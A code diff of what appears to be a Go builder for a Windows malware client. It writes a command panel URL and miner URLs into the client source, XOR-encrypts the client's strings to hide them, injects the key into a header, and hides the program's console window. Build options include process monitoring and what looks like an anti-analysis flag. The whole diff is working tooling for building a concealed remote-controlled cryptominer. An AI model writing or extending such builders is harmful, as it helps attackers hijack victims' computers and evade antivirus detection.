@@ -4,6 +4,7 @@ import (
 	"bufio"
 	"encoding/base64"
 	"fmt"
+	"math/rand"
 	"os"
 	"os/exec"
 	"path/filepath"
@@ -61,9 +62,12 @@ func checkVisualStudioOrMSBuild() error {
 
 	// Try where command
 	cmd := exec.Command("where", "msbuild.exe")
-	if err := cmd.Run(); err == nil {
-		logInfo("Found MSBuild in PATH")
-		return nil
+	if output, err := cmd.Output(); err == nil {
+		lines := strings.Split(strings.TrimSpace(string(output)), "\r\n")
+		if len(lines) > 0 && lines[0] != "" {
+			logInfo("Found MSBuild in PATH: %s", lines[0])
+			return nil
+		}
 	}
 
 	return fmt.Errorf("Visual Studio or MSBuild not found. Install Visual Studio Community 2026, 2022, or 2019")
@@ -182,7 +186,7 @@ func executeBuildWindows(panelURL string, processMonitoring, debugConsole, antiV
 		return fmt.Errorf("failed to inject encryption key: %v", err)
 	}
 
-	// Modify panel URL BEFORE encryption
+	// Modify panel URL and miner URLs BEFORE encryption
 	srcFile := filepath.Join(clientDir, "src", "main.cpp")
 	logInfo("Setting panel URL to: %s", panelURL)
 	if err := modifyPanelURL(srcFile, panelURL); err != nil {
@@ -195,7 +199,7 @@ func executeBuildWindows(panelURL string, processMonitoring, debugConsole, antiV
 		return fmt.Errorf("failed to decode XOR key: %v", err)
 	}
 
-	// Encrypt strings in source files (including the modified panel URL)
+	// Encrypt strings in source files (including the modified URLs)
 	logInfo("Encrypting strings in source files...")
 	if err := encryptSourceStrings(keyBytes); err != nil {
 		return fmt.Errorf("string encryption failed: %v", err)
@@ -405,7 +409,10 @@ func findMSBuild() string {
 	// Try PATH
 	cmd := exec.Command("where", "msbuild.exe")
 	if output, err := cmd.Output(); err == nil {
-		return strings.TrimSpace(string(output))
+		lines := strings.Split(strings.TrimSpace(string(output)), "\r\n")
+		if len(lines) > 0 && lines[0] != "" {
+			return lines[0]
+		}
 	}
 
 	return ""
@@ -419,10 +426,417 @@ func windowsMain() {
 	}
 }
 
+// modifyPanelURL modifies the panel URL in main.cpp
+func modifyPanelURL(filename, newURL string) error {
+	content, err := os.ReadFile(filename)
+	if err != nil {
+		return fmt.Errorf("failed to read file %s: %w", filename, err)
+	}
+
+	contentStr := string(content)
+
+	// Find the ENCRYPT_STR pattern in main.cpp
+	// Pattern: ENCRYPT_STR("http://...")
+	startMarker := `ENCRYPT_STR("`
+	startIdx := strings.Index(contentStr, startMarker)
+	if startIdx == -1 {
+		logError("Could not find '%s' in %s", startMarker, filename)
+		logError("File content preview (first 500 chars): %s", contentStr[:min(500, len(contentStr))])
+		return fmt.Errorf("could not find ENCRYPT_STR pattern for panel URL in main.cpp")
+	}
+
+	// Find the opening quote
+	quoteStart := startIdx + len(startMarker) - 1 // -1 to include the quote
+
+	// Find the closing quote (handle escapes)
+	quoteEnd := quoteStart + 1
+	for quoteEnd < len(contentStr) {
+		if contentStr[quoteEnd] == '\\' {
+			quoteEnd += 2 // Skip escaped character
+			continue
+		}
+		if contentStr[quoteEnd] == '"' {
+			break
+		}
+		quoteEnd++
+	}
+
+	if quoteEnd >= len(contentStr) {
+		return fmt.Errorf("could not find closing quote for panel URL")
+	}
+
+	// Replace the old URL with the new one
+	before := contentStr[:quoteStart+1] // Include opening quote
+	after := contentStr[quoteEnd:]      // Include closing quote onwards
+	contentStr = before + newURL + after
+
+	return os.WriteFile(filename, []byte(contentStr), 0644)
+}
+
 // min returns the minimum of two integers
 func min(a, b int) int {
 	if a < b {
 		return a
 	}
 	return b
+}
+
+// generateXORKey generates a random XOR key and returns it as base64
+func generateXORKey(length int) string {
+	key := make([]byte, length)
+	rand.Read(key)
+	return base64.StdEncoding.EncodeToString(key)
+}
+
+// injectEncryptionKey injects the XOR key into encryption.h
+func injectEncryptionKey(b64Key string) error {
+	encryptionHeaderPath := filepath.Join(clientDir, "include", "encryption.h")
+
+	content, err := os.ReadFile(encryptionHeaderPath)
+	if err != nil {
+		logError("Failed to read encryption.h: %v", err)
+		return err
+	}
+
+	contentStr := string(content)
+
+	// Replace: const std::string ENCRYPTION_KEY_B64 = "";
+	// With:    const std::string ENCRYPTION_KEY_B64 = "BASE64_KEY";
+	oldPattern := `const std::string ENCRYPTION_KEY_B64 = "";`
+	newPattern := fmt.Sprintf(`const std::string ENCRYPTION_KEY_B64 = "%s";`, b64Key)
+
+	if strings.Contains(contentStr, oldPattern) {
+		contentStr = strings.ReplaceAll(contentStr, oldPattern, newPattern)
+		logInfo("Injected XOR key into encryption.h")
+	} else {
+		logError("Could not find ENCRYPTION_KEY_B64 pattern in encryption.h")
+		return fmt.Errorf("encryption key pattern not found")
+	}
+
+	return os.WriteFile(encryptionHeaderPath, []byte(contentStr), 0644)
+}
+
+// encryptSourceStrings finds and encrypts ENCRYPT_STR calls and fills placeholders
+func encryptSourceStrings(keyBytes []byte) error {
+	const maxPlaceholders = 16
+	encryptedValues := []string{}
+
+	srcDir := filepath.Join(clientDir, "src")
+	entries, err := os.ReadDir(srcDir)
+	if err != nil {
+		return err
+	}
+
+	for _, entry := range entries {
+		if entry.IsDir() {
+			continue
+		}
+
+		name := entry.Name()
+		// Skip encryption.h as it contains decryption logic
+		if name == "encryption.h" {
+			continue
+		}
+		if !strings.HasSuffix(name, ".cpp") && !strings.HasSuffix(name, ".h") {
+			continue
+		}
+
+		filePath := filepath.Join(srcDir, name)
+		if err := encryptStringsInFile(filePath, keyBytes, &encryptedValues, maxPlaceholders); err != nil {
+			return fmt.Errorf("failed to encrypt %s: %w", filePath, err)
+		}
+	}
+
+	if err := injectEncryptedPlaceholders(encryptedValues); err != nil {
+		return err
+	}
+
+	return nil
+}
+
+// encryptStringsInFile encrypts ENCRYPT_STR calls in a file and stores the encrypted values
+func encryptStringsInFile(filePath string, keyBytes []byte, encryptedValues *[]string, maxPlaceholders int) error {
+	content, err := os.ReadFile(filePath)
+	if err != nil {
+		return err
+	}
+
+	contentStr := string(content)
+	modified := contentStr
+	encryptionCount := 0
+
+	// Find and encrypt all ENCRYPT_STR("...") calls
+	// Pattern: ENCRYPT_STR("...") where ... is the string to encrypt
+
+	for {
+		// Look for ENCRYPT_STR(
+		startIdx := strings.Index(modified, "ENCRYPT_STR(")
+		if startIdx == -1 {
+			break
+		}
+
+		// Find the opening quote after ENCRYPT_STR(
+		quoteStart := startIdx + len("ENCRYPT_STR(")
+
+		// Skip any whitespace
+		for quoteStart < len(modified) && (modified[quoteStart] == ' ' || modified[quoteStart] == '\t') {
+			quoteStart++
+		}
+
+		// Must have a quote
+		if quoteStart >= len(modified) || modified[quoteStart] != '"' {
+			break
+		}
+
+		// Find the closing quote (handle escapes)
+		quoteEnd := quoteStart + 1
+		for quoteEnd < len(modified) {
+			if modified[quoteEnd] == '\\' {
+				quoteEnd += 2 // Skip escaped character
+				continue
+			}
+			if modified[quoteEnd] == '"' {
+				break
+			}
+			quoteEnd++
+		}
+
+		if quoteEnd >= len(modified) {
+			break
+		}
+
+		// Extract the plaintext string (without quotes)
+		plaintext := modified[quoteStart+1 : quoteEnd]
+
+		// Encrypt it
+		ciphertext := make([]byte, len(plaintext))
+		for i := 0; i < len(plaintext); i++ {
+			ciphertext[i] = plaintext[i] ^ keyBytes[i%len(keyBytes)]
+		}
+
+		// Encode to base64
+		b64Encrypted := base64.StdEncoding.EncodeToString(ciphertext)
+
+		// Append to placeholder list
+		*encryptedValues = append(*encryptedValues, b64Encrypted)
+		placeholderIdx := len(*encryptedValues) - 1
+		if placeholderIdx >= maxPlaceholders {
+			return fmt.Errorf("not enough encrypted placeholders (max %d)", maxPlaceholders)
+		}
+
+		// Create the replacement: DecryptString(__ENCRYPTED_N__)
+		replacement := fmt.Sprintf(`DecryptString(__ENCRYPTED_%d__)`, placeholderIdx)
+
+		// Find the closing parenthesis of ENCRYPT_STR(...)
+		closeParenIdx := quoteEnd + 1
+		for closeParenIdx < len(modified) && (modified[closeParenIdx] == ' ' || modified[closeParenIdx] == '\t') {
+			closeParenIdx++
+		}
+
+		if closeParenIdx >= len(modified) || modified[closeParenIdx] != ')' {
+			break
+		}
+
+		// Replace ENCRYPT_STR("plaintext") with DecryptStringBase64("base64")
+		before := modified[:startIdx]
+		after := modified[closeParenIdx+1:]
+		modified = before + replacement + after
+
+		encryptionCount++
+
+		// Log the encryption
+		displayStr := plaintext
+		if len(displayStr) > 30 {
+			displayStr = displayStr[:30] + "..."
+		}
+		displayB64 := b64Encrypted
+		if len(displayB64) > 40 {
+			displayB64 = displayB64[:40] + "..."
+		}
+		logInfo("✓ Encrypted: %s -> %s", displayStr, displayB64)
+	}
+
+	// Only write back if we made changes
+	if encryptionCount > 0 {
+		logInfo("Encrypted %d strings in %s", encryptionCount, filepath.Base(filePath))
+		logInfo("Writing modified file back to: %s", filePath)
+		if err := os.WriteFile(filePath, []byte(modified), 0644); err != nil {
+			return err
+		}
+		logInfo("Successfully wrote modified file")
+	}
+
+	return nil
+}
+
+// injectEncryptedPlaceholders writes the encrypted base64 strings into encryption.h placeholders
+func injectEncryptedPlaceholders(values []string) error {
+	encryptionHeaderPath := filepath.Join(clientDir, "include", "encryption.h")
+	content, err := os.ReadFile(encryptionHeaderPath)
+	if err != nil {
+		return fmt.Errorf("failed to read encryption.h: %w", err)
+	}
+
+	contentStr := string(content)
+	for i, val := range values {
+		old := fmt.Sprintf(`const char __ENCRYPTED_%d__[] = "";`, i)
+		newStr := fmt.Sprintf(`const char __ENCRYPTED_%d__[] = "%s";`, i, val)
+		if strings.Contains(contentStr, old) {
+			contentStr = strings.ReplaceAll(contentStr, old, newStr)
+		} else {
+			return fmt.Errorf("placeholder __ENCRYPTED_%d__ not found", i)
+		}
+	}
+
+	if err := os.WriteFile(encryptionHeaderPath, []byte(contentStr), 0644); err != nil {
+		return fmt.Errorf("failed to write encryption.h: %w", err)
+	}
+
+	logInfo("Injected %d encrypted strings into encryption.h", len(values))
+	return nil
+}
+
+// toggleWin32Flag toggles the WIN32 flag in CMakeLists.txt
+// When enableDebugConsole is true, we comment out WIN32 and -mwindows to show console
+// When enableDebugConsole is false, we uncomment WIN32 and -mwindows to hide console
+func toggleWin32Flag(enableDebugConsole bool) error {
+	cmakePath := filepath.Join(clientDir, "CMakeLists.txt")
+	content, err := os.ReadFile(cmakePath)
+	if err != nil {
+		return err
+	}
+
+	contentStr := string(content)
+
+	// Use regex to handle both cases properly
+	if enableDebugConsole {
+		// Debug enabled: Comment out WIN32 and -mwindows to show console
+		contentStr = strings.ReplaceAll(contentStr, "    WIN32", "    #WIN32")
+		contentStr = strings.ReplaceAll(contentStr, "    LINK_FLAGS \"-mwindows\"", "    #LINK_FLAGS \"-mwindows\"")
+	} else {
+		// Debug disabled: Uncomment WIN32 and -mwindows to hide console
+		contentStr = strings.ReplaceAll(contentStr, "    #WIN32", "    WIN32")
+		contentStr = strings.ReplaceAll(contentStr, "    #LINK_FLAGS \"-mwindows\"", "    LINK_FLAGS \"-mwindows\"")
+	}
+
+	return os.WriteFile(cmakePath, []byte(contentStr), 0644)
+}
+
+// backupSourceFiles backs up source files
+func backupSourceFiles(backupDirPath string) error {
+	os.RemoveAll(backupDirPath)
+
+	srcDir := filepath.Join(clientDir, "src")
+	includeDir := filepath.Join(clientDir, "include")
+
+	if err := copyDirRecursive(srcDir, filepath.Join(backupDirPath, "src")); err != nil {
+		return err
+	}
+
+	if err := copyDirRecursive(includeDir, filepath.Join(backupDirPath, "include")); err != nil {
+		return err
+	}
+
+	return nil
+}
+
+// copyDirRecursive recursively copies a directory
+func copyDirRecursive(src, dst string) error {
+	srcInfo, err := os.Stat(src)
+	if err != nil {
+		return err
+	}
+
+	if err := os.MkdirAll(dst, srcInfo.Mode()); err != nil {
+		return err
+	}
+
+	entries, err := os.ReadDir(src)
+	if err != nil {
+		return err
+	}
+
+	for _, entry := range entries {
+		srcPath := filepath.Join(src, entry.Name())
+		dstPath := filepath.Join(dst, entry.Name())
+
+		if entry.IsDir() {
+			if err := copyDirRecursive(srcPath, dstPath); err != nil {
+				return err
+			}
+		} else {
+			data, err := os.ReadFile(srcPath)
+			if err != nil {
+				return err
+			}
+			if err := os.WriteFile(dstPath, data, 0644); err != nil {
+				return err
+			}
+		}
+	}
+
+	return nil
+}
+
+// restoreSourceFiles restores files from backup
+func restoreSourceFiles(backupDirPath string) error {
+	srcDir := filepath.Join(clientDir, "src")
+	includeDir := filepath.Join(clientDir, "include")
+
+	if err := restoreDirRecursive(filepath.Join(backupDirPath, "src"), srcDir); err != nil {
+		// Ignore if backup doesn't exist
+	}
+
+	if err := restoreDirRecursive(filepath.Join(backupDirPath, "include"), includeDir); err != nil {
+		// Ignore if backup doesn't exist
+	}
+
+	return nil
+}
+
+// restoreDirRecursive recursively restores a directory from backup
+func restoreDirRecursive(src, dst string) error {
+	srcInfo, err := os.Stat(src)
+	if err != nil {
+		return err
+	}
+
+	if err := os.MkdirAll(dst, srcInfo.Mode()); err != nil {
+		return err
+	}
+
+	entries, err := os.ReadDir(src)
+	if err != nil {
+		return err
+	}
+
+	for _, entry := range entries {
+		srcPath := filepath.Join(src, entry.Name())
+		dstPath := filepath.Join(dst, entry.Name())
+
+		if entry.IsDir() {
+			if err := restoreDirRecursive(srcPath, dstPath); err != nil {
+				return err
+			}
+		} else {
+			data, err := os.ReadFile(srcPath)
+			if err != nil {
+				return err
+			}
+			if err := os.WriteFile(dstPath, data, 0644); err != nil {
+				return err
+			}
+		}
+	}
+
+	return nil
+}
+
+// copyFile copies a file from src to dst
+func copyFile(src, dst string) error {
+	data, err := os.ReadFile(src)
+	if err != nil {
+		return err
+	}
+	return os.WriteFile(dst, data, 0644)
 }
